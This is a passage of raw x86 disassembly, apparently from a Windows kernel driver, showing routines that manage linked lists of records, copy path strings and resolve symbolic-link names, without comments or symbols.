   11df3:	call   0x1a20d
   11df8:	ret    0xc
   11dfb:	xor    ebx,ebx
   11dfd:	push   ebx
   11dfe:	push   0x1c100
   11e03:	call   DWORD PTR ds:0x1b1b0
   11e09:	ret    
   11e0a:	int3   
   11e0b:	int3   
   11e0c:	int3   
   11e0d:	int3   
   11e0e:	int3   
   11e0f:	int3   
   11e10:	mov    edi,edi
   11e12:	push   ebp
   11e13:	mov    ebp,esp
   11e15:	push   esi
   11e16:	xor    esi,esi
   11e18:	jmp    0x11e1b
   11e1a:	inc    esi
   11e1b:	push   DWORD PTR [ebp+0xc]
   11e1e:	push   0x0
   11e20:	push   DWORD PTR [ebp+0x8]
   11e23:	call   0x11d42
   11e28:	test   al,al
   11e2a:	jne    0x11e1a
   11e2c:	mov    eax,esi
   11e2e:	pop    esi
   11e2f:	pop    ebp
   11e30:	ret    0x8
   11e33:	int3   
   11e34:	int3   
   11e35:	int3   
   11e36:	int3   
   11e37:	int3   
   11e38:	push   0xc
   11e3a:	push   0x1b468
   11e3f:	call   0x1a1c8
   11e44:	mov    BYTE PTR [ebp-0x19],0x0
   11e48:	xor    esi,esi
   11e4a:	push   esi
   11e4b:	push   esi
   11e4c:	push   esi
   11e4d:	push   esi
   11e4e:	push   0x1c100
   11e53:	call   DWORD PTR ds:0x1b110
   11e59:	cmp    eax,esi
   11e5b:	je     0x11e64
   11e5d:	xor    al,al
   11e5f:	jmp    0x11f72
   11e64:	mov    DWORD PTR [ebp-0x4],esi
   11e67:	push   DWORD PTR [ebp+0x10]
   11e6a:	push   DWORD PTR [ebp+0x20]
   11e6d:	mov    ebx,DWORD PTR [ebp+0x8]
   11e70:	push   ebx
   11e71:	call   0x11c9e
   11e76:	cmp    eax,esi
   11e78:	jne    0x11f63
   11e7e:	mov    edi,0x238
   11e83:	push   edi
   11e84:	push   0x1
   11e86:	call   DWORD PTR ds:0x1b124
   11e8c:	mov    esi,eax
   11e8e:	test   esi,esi
   11e90:	je     0x11f63
   11e96:	push   edi
   11e97:	push   0x0
   11e99:	push   esi
   11e9a:	call   0x1a1b0
   11e9f:	add    esp,0xc
   11ea2:	mov    DWORD PTR [esi],ebx
   11ea4:	dec    ebx
   11ea5:	je     0x11ebb
   11ea7:	dec    ebx
   11ea8:	je     0x11ebb
   11eaa:	dec    ebx
   11eab:	jne    0x11ed3
   11ead:	mov    eax,DWORD PTR [ebp+0xc]
   11eb0:	mov    DWORD PTR [esi+0x8],eax
   11eb3:	mov    eax,DWORD PTR [ebp+0x10]
   11eb6:	mov    DWORD PTR [esi+0xc],eax
   11eb9:	jmp    0x11ed3
   11ebb:	mov    eax,DWORD PTR [ebp+0x10]
   11ebe:	mov    DWORD PTR [esi+0xc],eax
   11ec1:	mov    eax,DWORD PTR [ebp+0x14]
   11ec4:	mov    DWORD PTR [esi+0x10],eax
   11ec7:	mov    eax,DWORD PTR [ebp+0x1c]
   11eca:	mov    DWORD PTR [esi+0x18],eax
   11ecd:	mov    eax,DWORD PTR [ebp+0x18]
   11ed0:	mov    DWORD PTR [esi+0x14],eax
   11ed3:	mov    edi,DWORD PTR [ebp+0x20]
   11ed6:	test   edi,edi
   11ed8:	je     0x11f1c
   11eda:	mov    eax,edi
   11edc:	lea    edx,[eax+0x2]
   11edf:	mov    cx,WORD PTR [eax]
   11ee2:	inc    eax
   11ee3:	inc    eax
   11ee4:	test   cx,cx
   11ee7:	jne    0x11edf
   11ee9:	sub    eax,edx
   11eeb:	sar    eax,1
   11eed:	mov    ecx,0x103
   11ef2:	cmp    eax,ecx
   11ef4:	jae    0x11f0b
   11ef6:	mov    eax,edi
   11ef8:	lea    edx,[eax+0x2]
   11efb:	mov    cx,WORD PTR [eax]
   11efe:	inc    eax
   11eff:	inc    eax
   11f00:	test   cx,cx
   11f03:	jne    0x11efb
   11f05:	sub    eax,edx
   11f07:	sar    eax,1
   11f09:	jmp    0x11f0d
   11f0b:	mov    eax,ecx
   11f0d:	push   eax
   11f0e:	push   edi
   11f0f:	lea    eax,[esi+0x1c]
   11f12:	push   eax
   11f13:	call   DWORD PTR ds:0x1b194
   11f19:	add    esp,0xc
   11f1c:	mov    eax,DWORD PTR [ebp+0x24]
   11f1f:	mov    DWORD PTR [esi+0x224],eax
   11f25:	mov    eax,DWORD PTR [ebp+0x28]
   11f28:	mov    DWORD PTR [esi+0x228],eax
   11f2e:	mov    eax,DWORD PTR [ebp+0x2c]
   11f31:	mov    DWORD PTR [esi+0x22c],eax
   11f37:	mov    eax,ds:0x1bfd8
   11f3c:	test   eax,eax
   11f3e:	je     0x11f53
   11f40:	mov    DWORD PTR [eax+0x230],esi
   11f46:	mov    eax,ds:0x1bfd8
   11f4b:	mov    DWORD PTR [esi+0x234],eax
   11f51:	jmp    0x11f59
   11f53:	mov    DWORD PTR ds:0x1bfd4,esi
   11f59:	mov    DWORD PTR ds:0x1bfd8,esi
   11f5f:	mov    BYTE PTR [ebp-0x19],0x1
   11f63:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11f6a:	call   0x11f7a
   11f6f:	mov    al,BYTE PTR [ebp-0x19]
   11f72:	call   0x1a20d
   11f77:	ret    0x28
   11f7a:	push   0x0
   11f7c:	push   0x1c100
   11f81:	call   DWORD PTR ds:0x1b1b0
   11f87:	ret    
   11f88:	int3   
   11f89:	int3   
   11f8a:	int3   
   11f8b:	int3   
   11f8c:	int3   
   11f8d:	int3   
   11f8e:	push   0xc
   11f90:	push   0x1b488
   11f95:	call   0x1a1c8
   11f9a:	mov    esi,DWORD PTR ds:0x1bfc4
   11fa0:	mov    DWORD PTR [ebp-0x1c],esi
   11fa3:	xor    edi,edi
   11fa5:	push   edi
   11fa6:	push   edi
   11fa7:	push   edi
   11fa8:	push   edi
   11fa9:	push   0x1c9c0
   11fae:	call   DWORD PTR ds:0x1b110
   11fb4:	cmp    eax,edi
   11fb6:	je     0x11fbc
   11fb8:	xor    eax,eax
   11fba:	jmp    0x12031
   11fbc:	mov    DWORD PTR [ebp-0x4],edi
   11fbf:	mov    ebx,DWORD PTR [ebp+0xc]
   11fc2:	cmp    esi,edi
   11fc4:	je     0x1201e
   11fc6:	mov    eax,DWORD PTR [esi]
   11fc8:	cmp    eax,DWORD PTR [ebp+0x8]
   11fcb:	jne    0x12013
   11fcd:	xor    eax,eax
   11fcf:	cmp    ebx,edi
   11fd1:	je     0x11fd9
   11fd3:	cmp    DWORD PTR [esi+0x4],ebx
   11fd6:	sete   al
   11fd9:	cmp    eax,edi
   11fdb:	jne    0x12023
   11fdd:	mov    eax,DWORD PTR [ebp+0x10]
   11fe0:	cmp    eax,edi
   11fe2:	je     0x1200d
   11fe4:	lea    edx,[eax+0x2]
   11fe7:	mov    cx,WORD PTR [eax]
   11fea:	inc    eax
   11feb:	inc    eax
   11fec:	cmp    cx,di
   11fef:	jne    0x11fe7
   11ff1:	sub    eax,edx
   11ff3:	sar    eax,1
   11ff5:	je     0x1200d
   11ff7:	push   DWORD PTR [ebp+0x10]
   11ffa:	lea    eax,[esi+0x8]
   11ffd:	push   eax
   11ffe:	call   DWORD PTR ds:0x1b168
   12004:	pop    ecx
   12005:	pop    ecx
   12006:	neg    eax
   12008:	sbb    eax,eax
   1200a:	inc    eax
   1200b:	jmp    0x1200f
   1200d:	xor    eax,eax
   1200f:	cmp    eax,edi
   12011:	jne    0x12023
   12013:	mov    esi,DWORD PTR [esi+0x210]
   12019:	mov    DWORD PTR [ebp-0x1c],esi
   1201c:	jmp    0x11fc2
   1201e:	xor    esi,esi
   12020:	mov    DWORD PTR [ebp-0x1c],esi
   12023:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1202a:	call   0x1203e
   1202f:	mov    eax,esi
   12031:	call   0x1a20d
   12036:	ret    0xc
   12039:	xor    edi,edi
   1203b:	mov    esi,DWORD PTR [ebp-0x1c]
   1203e:	push   edi
   1203f:	push   0x1c9c0
   12044:	call   DWORD PTR ds:0x1b1b0
   1204a:	ret    
   1204b:	int3   
   1204c:	int3   
   1204d:	int3   
   1204e:	int3   
   1204f:	int3   
   12050:	push   0x630
   12055:	push   0x1b4a8
   1205a:	call   0x1a38c
   1205f:	mov    esi,DWORD PTR [ebp+0x10]
   12062:	mov    DWORD PTR [ebp-0x63c],esi
   12068:	xor    ebx,ebx
   1206a:	mov    BYTE PTR [ebp-0x635],bl
   12070:	cmp    DWORD PTR [ebp+0xc],ebx
   12073:	jne    0x12095
   12075:	cmp    esi,ebx
   12077:	je     0x12095
   12079:	mov    eax,esi
   1207b:	lea    edx,[eax+0x2]
   1207e:	mov    cx,WORD PTR [eax]
   12081:	inc    eax
   12082:	inc    eax
   12083:	cmp    cx,bx
   12086:	jne    0x1207e
   12088:	sub    eax,edx
   1208a:	sar    eax,1
   1208c:	jne    0x12095
   1208e:	xor    al,al
   12090:	jmp    0x1221f
   12095:	push   ebx
   12096:	push   ebx
   12097:	push   ebx
   12098:	push   ebx
   12099:	push   0x1c9c0
   1209e:	call   DWORD PTR ds:0x1b110
   120a4:	cmp    eax,ebx
   120a6:	jne    0x1208e
   120a8:	mov    DWORD PTR [ebp-0x4],ebx
   120ab:	push   esi
   120ac:	push   DWORD PTR [ebp+0xc]
   120af:	push   DWORD PTR [ebp+0x8]
   120b2:	call   0x11f8e
   120b7:	cmp    eax,ebx
   120b9:	jne    0x1220d
   120bf:	mov    edi,0x238
   120c4:	push   edi
   120c5:	push   0x1
   120c7:	call   DWORD PTR ds:0x1b124
   120cd:	mov    esi,eax
   120cf:	cmp    esi,ebx
   120d1:	je     0x1220d
   120d7:	push   edi
   120d8:	push   ebx
   120d9:	push   esi
   120da:	call   0x1a1b0
   120df:	add    esp,0xc
   120e2:	mov    eax,DWORD PTR [ebp+0x8]
   120e5:	mov    DWORD PTR [esi],eax
   120e7:	mov    eax,DWORD PTR [ebp+0xc]
   120ea:	mov    DWORD PTR [esi+0x4],eax
   120ed:	mov    edi,DWORD PTR [ebp-0x63c]
   120f3:	cmp    edi,ebx
   120f5:	je     0x12139
   120f7:	mov    eax,edi
   120f9:	lea    edx,[eax+0x2]
   120fc:	mov    cx,WORD PTR [eax]
   120ff:	inc    eax
   12100:	inc    eax
   12101:	cmp    cx,bx
   12104:	jne    0x120fc
   12106:	sub    eax,edx
   12108:	sar    eax,1
   1210a:	mov    ecx,0x103
   1210f:	cmp    eax,ecx
   12111:	jae    0x12128
   12113:	mov    eax,edi
   12115:	lea    edx,[eax+0x2]
   12118:	mov    cx,WORD PTR [eax]
   1211b:	inc    eax
   1211c:	inc    eax
   1211d:	cmp    cx,bx
   12120:	jne    0x12118
   12122:	sub    eax,edx
   12124:	sar    eax,1
   12126:	jmp    0x1212a
   12128:	mov    eax,ecx
   1212a:	push   eax
   1212b:	push   edi
   1212c:	lea    eax,[esi+0x8]
   1212f:	push   eax
   12130:	call   DWORD PTR ds:0x1b194
   12136:	add    esp,0xc
   12139:	mov    eax,ds:0x1bfc8
   1213e:	cmp    eax,ebx
   12140:	je     0x12155
   12142:	mov    DWORD PTR [eax+0x210],esi
   12148:	mov    eax,ds:0x1bfc8
   1214d:	mov    DWORD PTR [esi+0x214],eax
   12153:	jmp    0x1215b
   12155:	mov    DWORD PTR ds:0x1bfc4,esi
   1215b:	mov    DWORD PTR ds:0x1bfc8,esi
   12161:	mov    BYTE PTR [ebp-0x635],0x1
   12168:	cmp    BYTE PTR [ebp+0x14],bl
   1216b:	je     0x1220d
   12171:	push   0x410
   12176:	push   ebx
   12177:	lea    eax,[ebp-0x634]
   1217d:	push   eax
   1217e:	call   0x1a1b0
   12183:	push   0x208
   12188:	push   ebx
   12189:	lea    eax,[ebp-0x224]
   1218f:	push   eax
   12190:	call   0x1a1b0
   12195:	mov    eax,ds:0x1bfa4
   1219a:	inc    eax
   1219b:	push   eax
   1219c:	push   0x1a5b4
   121a1:	lea    eax,[ebp-0x224]
   121a7:	push   eax
   121a8:	mov    esi,DWORD PTR ds:0x1b1b8
   121ae:	call   esi
   121b0:	push   DWORD PTR [ebp+0xc]
   121b3:	push   edi
   121b4:	push   DWORD PTR [ebp+0x8]
   121b7:	push   0x1a59e
   121bc:	lea    eax,[ebp-0x634]
   121c2:	push   eax
   121c3:	call   esi
   121c5:	add    esp,0x38
   121c8:	lea    eax,[ebp-0x634]
   121ce:	lea    ecx,[eax+0x2]
   121d1:	mov    dx,WORD PTR [eax]
   121d4:	inc    eax
   121d5:	inc    eax
   121d6:	cmp    dx,bx
   121d9:	jne    0x121d1
   121db:	sub    eax,ecx
   121dd:	sar    eax,1
   121df:	add    eax,eax
   121e1:	push   eax
   121e2:	lea    eax,[ebp-0x634]
   121e8:	push   eax
   121e9:	push   0x1
   121eb:	lea    eax,[ebp-0x224]
   121f1:	push   eax
   121f2:	push   ebx
   121f3:	push   0x1
   121f5:	call   DWORD PTR ds:0x1b1b4
   121fb:	cmp    eax,ebx
   121fd:	jne    0x12207
   121ff:	inc    DWORD PTR ds:0x1bfa4
   12205:	jmp    0x1220d
   12207:	mov    BYTE PTR [ebp-0x635],bl
   1220d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   12214:	call   0x12229
   12219:	mov    al,BYTE PTR [ebp-0x635]
   1221f:	call   0x1a3d4
   12224:	ret    0x10
   12227:	xor    ebx,ebx
   12229:	push   ebx
   1222a:	push   0x1c9c0
   1222f:	call   DWORD PTR ds:0x1b1b0
   12235:	ret    
   12236:	int3   
   12237:	int3   
   12238:	int3   
   12239:	int3   
   1223a:	int3   
   1223b:	int3   
   1223c:	mov    edi,edi
   1223e:	push   ebp
   1223f:	mov    ebp,esp
   12241:	push   ebx
   12242:	xor    ebx,ebx
   12244:	cmp    DWORD PTR [ebp+0x8],ebx
   12247:	push   esi
   12248:	push   edi
   12249:	je     0x122a3
   1224b:	cmp    DWORD PTR ds:0x1bfa8,ebx
   12251:	je     0x122a3
   12253:	cmp    DWORD PTR ds:0x1bfac,ebx
   12259:	je     0x122a3
   1225b:	call   DWORD PTR ds:0x1b1a8
   12261:	mov    edx,DWORD PTR ds:0x1bfa8
   12267:	mov    edi,DWORD PTR [edx+eax*1]
   1226a:	cmp    DWORD PTR [ebp+0x8],edi
   1226d:	mov    ecx,DWORD PTR ds:0x1bfac
   12273:	mov    esi,edi
   12275:	je     0x1228e
   12277:	cmp    ebx,0x1
   1227a:	jl     0x12280
   1227c:	cmp    edi,esi
   1227e:	je     0x122a3
   12280:	mov    eax,DWORD PTR [ecx+eax*1]
   12283:	sub    eax,ecx
   12285:	mov    esi,DWORD PTR [edx+eax*1]
   12288:	inc    ebx
   12289:	cmp    DWORD PTR [ebp+0x8],esi
   1228c:	jne    0x12277
   1228e:	add    eax,ecx
   12290:	mov    ecx,DWORD PTR [eax+0x4]
   12293:	mov    edx,DWORD PTR [eax]
   12295:	mov    DWORD PTR [ecx],edx
   12297:	mov    ecx,DWORD PTR [eax]
   12299:	mov    eax,DWORD PTR [eax+0x4]
   1229c:	mov    DWORD PTR [ecx+0x4],eax
   1229f:	mov    al,0x1
   122a1:	jmp    0x122a5
   122a3:	xor    al,al
   122a5:	pop    edi
   122a6:	pop    esi
   122a7:	pop    ebx
   122a8:	pop    ebp
   122a9:	ret    0x4
   122ac:	int3   
   122ad:	int3   
   122ae:	int3   
   122af:	int3   
   122b0:	int3   
   122b1:	int3   
   122b2:	mov    edi,edi
   122b4:	push   ebp
   122b5:	mov    ebp,esp
   122b7:	sub    esp,0x20
   122ba:	push   edi
   122bb:	push   DWORD PTR [ebp+0x8]
   122be:	lea    eax,[ebp-0x8]
   122c1:	push   eax
   122c2:	call   DWORD PTR ds:0x1b164
   122c8:	lea    eax,[ebp-0x8]
   122cb:	mov    DWORD PTR [ebp-0x18],eax
   122ce:	lea    eax,[ebp-0x20]
   122d1:	push   eax
   122d2:	xor    edi,edi
   122d4:	push   0x80000000
   122d9:	lea    eax,[ebp+0x8]
   122dc:	push   eax
   122dd:	mov    DWORD PTR [ebp-0x20],0x18
   122e4:	mov    DWORD PTR [ebp-0x1c],edi
   122e7:	mov    DWORD PTR [ebp-0x14],0x40
   122ee:	mov    DWORD PTR [ebp-0x10],edi
   122f1:	mov    DWORD PTR [ebp-0xc],edi
   122f4:	call   DWORD PTR ds:0x1b1c0
   122fa:	cmp    eax,edi
   122fc:	jne    0x12367
   122fe:	push   esi
   122ff:	mov    esi,DWORD PTR [ebp+0xc]
   12302:	push   0x208
   12307:	push   0x1
   12309:	mov    WORD PTR [esi+0x2],0x208
   1230f:	mov    WORD PTR [esi],di
   12312:	call   DWORD PTR ds:0x1b124
   12318:	cmp    eax,edi
   1231a:	mov    DWORD PTR [esi+0x4],eax
   1231d:	jne    0x1232f
   1231f:	push   DWORD PTR [ebp+0x8]
   12322:	call   DWORD PTR ds:0x1b180
   12328:	mov    eax,0xc000009a
   1232d:	jmp    0x12366
   1232f:	movzx  ecx,WORD PTR [esi+0x2]
   12333:	push   ebx
   12334:	push   ecx
   12335:	push   edi
   12336:	push   eax
   12337:	call   0x1a1b0
   1233c:	add    esp,0xc
   1233f:	push   edi
   12340:	push   esi
   12341:	push   DWORD PTR [ebp+0x8]
   12344:	call   DWORD PTR ds:0x1b1bc
   1234a:	push   DWORD PTR [ebp+0x8]
   1234d:	mov    ebx,eax
   1234f:	call   DWORD PTR ds:0x1b180
   12355:	cmp    ebx,edi
   12357:	je     0x12363
   12359:	push   edi
   1235a:	push   DWORD PTR [esi+0x4]
   1235d:	call   DWORD PTR ds:0x1b278
   12363:	mov    eax,ebx
   12365:	pop    ebx
   12366:	pop    esi
   12367:	pop    edi
   12368:	leave  
   12369:	ret    0x8
   1236c:	int3   
   1236d:	int3   
   1236e:	int3   
   1236f:	int3   
   12370:	int3   
   12371:	int3   
   12372:	mov    edi,edi
   12374:	push   ebp
   12375:	mov    ebp,esp
   12377:	sub    esp,0x428
   1237d:	mov    eax,ds:0x1bb6c
   12382:	xor    eax,ebp
   12384:	mov    DWORD PTR [ebp-0x4],eax
   12387:	push   ebx
   12388:	push   esi
   12389:	mov    esi,DWORD PTR [ebp+0x8]
   1238c:	mov    eax,DWORD PTR [esi+0x4]
   1238f:	test   eax,eax
   12391:	push   edi
   12392:	mov    edi,DWORD PTR [ebp+0xc]
   12395:	mov    DWORD PTR [ebp-0x428],esi
   1239b:	mov    DWORD PTR [ebp-0x424],edi
   123a1:	mov    DWORD PTR [ebp-0x418],eax
   123a7:	je     0x125f4
   123ad:	cmp    DWORD PTR [edi+0x4],0x0
   123b1:	je     0x125f4
   123b7:	mov    ebx,0x208
   123bc:	push   ebx
   123bd:	lea    eax,[ebp-0x20c]
   123c3:	push   0x0
   123c5:	push   eax
   123c6:	call   0x1a1b0
   123cb:	add    esp,0xc
   123ce:	xor    eax,eax
   123d0:	movzx  ecx,WORD PTR [eax+0x1a5da]
   123d7:	mov    WORD PTR [ebp+eax*1-0x20c],cx
   123df:	inc    eax
   123e0:	inc    eax
   123e1:	test   cx,cx
   123e4:	jne    0x123d0
   123e6:	cmp    BYTE PTR [ebp+0x10],cl
   123e9:	jne    0x1243f
   123eb:	mov    edx,DWORD PTR [ebp-0x418]
   123f1:	lea    ecx,[ebp-0x20c]
   123f7:	movzx  eax,WORD PTR [ecx]
   123fa:	inc    ecx
   123fb:	mov    WORD PTR [edx],ax
   123fe:	inc    ecx
   123ff:	inc    edx
   12400:	inc    edx
   12401:	test   ax,ax
   12404:	jne    0x123f7
   12406:	mov    edx,DWORD PTR [edi+0x4]
   12409:	lea    ecx,[ebp-0x20c]
   1240f:	movzx  eax,WORD PTR [ecx]
   12412:	inc    ecx
   12413:	mov    WORD PTR [edx],ax
   12416:	inc    ecx
   12417:	inc    edx
   12418:	inc    edx
   12419:	test   ax,ax
   1241c:	jne    0x1240f
   1241e:	mov    edi,DWORD PTR [edi+0x4]
   12421:	dec    edi
   12422:	dec    edi
   12423:	mov    ax,WORD PTR [edi+0x2]
   12427:	inc    edi
   12428:	inc    edi
   12429:	test   ax,ax
   1242c:	jne    0x12423
   1242e:	push   0x5
   12430:	pop    ecx
   12431:	mov    esi,0x1a5c6
   12436:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12438:	xor    eax,eax
   1243a:	jmp    0x125f9
   1243f:	lea    eax,[ebp-0x420]
   12445:	push   eax
   12446:	lea    eax,[ebp-0x20c]
   1244c:	push   eax
   1244d:	call   0x122b2
   12452:	test   eax,eax
   12454:	mov    DWORD PTR [ebp-0x418],eax
   1245a:	jne    0x125ec
   12460:	lea    eax,[ebp-0x420]
   12466:	push   eax
   12467:	push   esi
   12468:	mov    esi,DWORD PTR ds:0x1b160
   1246e:	call   esi
   12470:	lea    eax,[ebp-0x420]
   12476:	push   eax
   12477:	push   edi
   12478:	call   esi
   1247a:	push   0x1a5c6
   1247f:	push   edi
   12480:	mov    edi,DWORD PTR ds:0x1b280
   12486:	call   edi
   12488:	push   ebx
   12489:	lea    eax,[ebp-0x20c]
   1248f:	push   0x0
   12491:	push   eax
   12492:	call   0x1a1b0
   12497:	mov    eax,DWORD PTR [ebp-0x41c]
   1249d:	add    esp,0xc
   124a0:	lea    ecx,[eax+0x2]
   124a3:	mov    dx,WORD PTR [eax]
   124a6:	inc    eax
   124a7:	inc    eax
   124a8:	test   dx,dx
   124ab:	jne    0x124a3
   124ad:	sub    eax,ecx
   124af:	sar    eax,1
   124b1:	mov    ecx,0x103
   124b6:	cmp    eax,ecx
   124b8:	jae    0x124d3
   124ba:	mov    eax,DWORD PTR [ebp-0x41c]
   124c0:	lea    edx,[eax+0x2]
   124c3:	mov    cx,WORD PTR [eax]
   124c6:	inc    eax
   124c7:	inc    eax
   124c8:	test   cx,cx
   124cb:	jne    0x124c3
   124cd:	sub    eax,edx
   124cf:	sar    eax,1
   124d1:	jmp    0x124d5
   124d3:	mov    eax,ecx
   124d5:	push   eax
   124d6:	push   DWORD PTR [ebp-0x41c]
   124dc:	lea    eax,[ebp-0x20c]
   124e2:	push   eax
   124e3:	call   DWORD PTR ds:0x1b194
   124e9:	add    esp,0xc
   124ec:	push   0x0
   124ee:	push   DWORD PTR [ebp-0x41c]
   124f4:	call   DWORD PTR ds:0x1b278
   124fa:	lea    eax,[ebp-0x20c]
   12500:	push   0x5c
   12502:	push   eax
   12503:	call   DWORD PTR ds:0x1b16c
   12509:	test   eax,eax
   1250b:	pop    ecx
   1250c:	pop    ecx
   1250d:	mov    DWORD PTR [ebp-0x418],eax
   12513:	je     0x125e2
   12519:	push   ebx
   1251a:	lea    eax,[ebp-0x414]
   12520:	push   0x0
   12522:	push   eax
   12523:	call   0x1a1b0
   12528:	mov    ebx,DWORD PTR [ebp-0x418]
   1252e:	mov    eax,ebx
   12530:	add    esp,0xc
   12533:	lea    edx,[eax+0x2]
   12536:	mov    cx,WORD PTR [eax]
   12539:	inc    eax
   1253a:	inc    eax
   1253b:	test   cx,cx
   1253e:	jne    0x12536
   12540:	sub    eax,edx
   12542:	sar    eax,1
   12544:	mov    ecx,0x103
   12549:	cmp    eax,ecx
   1254b:	jae    0x12562
   1254d:	mov    eax,ebx
   1254f:	lea    edx,[eax+0x2]
   12552:	mov    cx,WORD PTR [eax]
   12555:	inc    eax
   12556:	inc    eax
   12557:	test   cx,cx
   1255a:	jne    0x12552
   1255c:	sub    eax,edx
   1255e:	sar    eax,1
   12560:	jmp    0x12564
   12562:	mov    eax,ecx
   12564:	push   eax
   12565:	lea    eax,[ebp-0x414]
   1256b:	push   ebx
   1256c:	push   eax
   1256d:	call   DWORD PTR ds:0x1b194
   12573:	and    WORD PTR [ebx],0x0
   12577:	add    esp,0xc
   1257a:	lea    eax,[ebp-0x420]
   12580:	push   eax
   12581:	lea    eax,[ebp-0x20c]
   12587:	push   eax
   12588:	call   0x122b2
   1258d:	test   eax,eax
   1258f:	mov    DWORD PTR [ebp-0x418],eax
   12595:	jne    0x125ec
   12597:	lea    eax,[ebp-0x414]
   1259d:	push   eax
   1259e:	lea    eax,[ebp-0x420]
   125a4:	push   eax
   125a5:	call   edi
   125a7:	lea    eax,[ebp-0x420]
   125ad:	push   eax
   125ae:	push   DWORD PTR [ebp-0x428]
   125b4:	call   esi
   125b6:	lea    eax,[ebp-0x420]
   125bc:	push   eax
   125bd:	push   DWORD PTR [ebp-0x424]
   125c3:	call   esi
   125c5:	push   0x1a5c6
   125ca:	push   DWORD PTR [ebp-0x424]
   125d0:	call   edi
   125d2:	push   0x0
   125d4:	push   DWORD PTR [ebp-0x41c]
   125da:	call   DWORD PTR ds:0x1b278
   125e0:	jmp    0x125ec
   125e2:	mov    DWORD PTR [ebp-0x418],0xc000009a
   125ec:	mov    eax,DWORD PTR [ebp-0x418]
   125f2:	jmp    0x125f9
   125f4:	mov    eax,0xc000000d
   125f9:	mov    ecx,DWORD PTR [ebp-0x4]
   125fc:	pop    edi
   125fd:	pop    esi
   125fe:	xor    ecx,ebp
   12600:	pop    ebx
   12601:	call   0x1a164
   12606:	leave  
   12607:	ret    0xc
   1260a:	int3   
   1260b:	int3   
   1260c:	int3   
   1260d:	int3   
   1260e:	int3   
   1260f:	int3   
   12610:	mov    edi,edi
   12612:	push   ebp
   12613:	mov    ebp,esp
   12615:	sub    esp,0x648
   1261b:	mov    eax,ds:0x1bb6c
   12620:	xor    eax,ebp
   12622:	mov    DWORD PTR [ebp-0x4],eax
   12625:	mov    eax,DWORD PTR [ebp+0x8]
   12628:	mov    ecx,DWORD PTR [ebp+0x18]
   1262b:	and    DWORD PTR [ebp-0x63c],0x0
   12632:	test   eax,eax
   12634:	push   ebx
   12635:	mov    ebx,DWORD PTR [ebp+0x10]
   12638:	push   esi
   12639:	push   edi
   1263a:	mov    esi,0x1a660
   1263f:	lea    edi,[ebp-0x14]
   12642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   12645:	mov    DWORD PTR [ebp-0x640],eax
   1264b:	mov    DWORD PTR [ebp-0x630],ebx
   12651:	mov    DWORD PTR [ebp-0x644],ecx
   12657:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   12659:	je     0x130e7
   1265f:	test   ebx,ebx
   12661:	je     0x130e7
   12667:	mov    esi,0x208
   1266c:	push   esi
   1266d:	lea    eax,[ebp-0x424]
   12673:	push   0x0
   12675:	push   eax
   12676:	call   0x1a1b0
   1267b:	push   esi
   1267c:	lea    eax,[ebp-0x21c]
   12682:	push   0x0
   12684:	push   eax
   12685:	call   0x1a1b0
   1268a:	mov    eax,DWORD PTR [ebp+0x14]
   1268d:	add    esp,0x18
   12690:	test   eax,eax
   12692:	je     0x12698
   12694:	shr    eax,1
   12696:	jmp    0x126ab
   12698:	mov    eax,ebx
   1269a:	lea    edx,[eax+0x2]
   1269d:	mov    cx,WORD PTR [eax]
   126a0:	inc    eax
   126a1:	inc    eax
   126a2:	test   cx,cx
   126a5:	jne    0x1269d
   126a7:	sub    eax,edx
   126a9:	sar    eax,1
   126ab:	mov    ebx,0x103
   126b0:	cmp    eax,ebx
   126b2:	jae    0x126d8
   126b4:	mov    eax,DWORD PTR [ebp+0x14]
   126b7:	test   eax,eax
   126b9:	je     0x126bf
   126bb:	shr    eax,1
   126bd:	jmp    0x126da
   126bf:	mov    eax,DWORD PTR [ebp-0x630]
   126c5:	lea    edx,[eax+0x2]
   126c8:	mov    cx,WORD PTR [eax]
   126cb:	inc    eax
   126cc:	inc    eax
   126cd:	test   cx,cx
   126d0:	jne    0x126c8
   126d2:	sub    eax,edx
   126d4:	sar    eax,1
   126d6:	jmp    0x126da
   126d8:	mov    eax,ebx
   126da:	push   eax
   126db:	push   DWORD PTR [ebp-0x630]
   126e1:	lea    eax,[ebp-0x424]
   126e7:	push   eax
   126e8:	call   DWORD PTR ds:0x1b194
   126ee:	lea    eax,[ebp-0x424]
   126f4:	push   0x1a63e
   126f9:	push   eax
   126fa:	call   DWORD PTR ds:0x1b1c8
   12700:	mov    esi,eax
   12702:	add    esp,0x14
   12705:	test   esi,esi
   12707:	je     0x127cf
   1270d:	lea    eax,[ebp-0x424]
   12713:	cmp    esi,eax
   12715:	je     0x127cf
   1271b:	mov    edi,0x208
   12720:	push   edi
   12721:	lea    eax,[ebp-0x21c]
   12727:	push   0x0
   12729:	push   eax
   1272a:	call   0x1a1b0
   1272f:	mov    eax,esi
   12731:	add    esp,0xc
   12734:	lea    edx,[eax+0x2]
   12737:	mov    cx,WORD PTR [eax]
   1273a:	inc    eax
   1273b:	inc    eax
   1273c:	test   cx,cx
   1273f:	jne    0x12737
   12741:	sub    eax,edx
   12743:	sar    eax,1
   12745:	cmp    eax,ebx
   12747:	jae    0x1275e
   12749:	mov    eax,esi
   1274b:	lea    edx,[eax+0x2]
   1274e:	mov    cx,WORD PTR [eax]
   12751:	inc    eax
   12752:	inc    eax
   12753:	test   cx,cx
   12756:	jne    0x1274e
   12758:	sub    eax,edx
   1275a:	sar    eax,1
   1275c:	jmp    0x12760
   1275e:	mov    eax,ebx
   12760:	push   eax
   12761:	lea    eax,[ebp-0x21c]
   12767:	push   esi
   12768:	push   eax
   12769:	call   DWORD PTR ds:0x1b194
   1276f:	push   edi
   12770:	lea    eax,[ebp-0x424]
   12776:	push   0x0
   12778:	push   eax
   12779:	call   0x1a1b0
   1277e:	lea    eax,[ebp-0x21c]
   12784:	add    esp,0x18
   12787:	lea    ecx,[eax+0x2]
   1278a:	mov    dx,WORD PTR [eax]
   1278d:	inc    eax
   1278e:	inc    eax
   1278f:	test   dx,dx
   12792:	jne    0x1278a
   12794:	sub    eax,ecx
   12796:	sar    eax,1
   12798:	cmp    eax,ebx
   1279a:	jae    0x127b5
   1279c:	lea    eax,[ebp-0x21c]
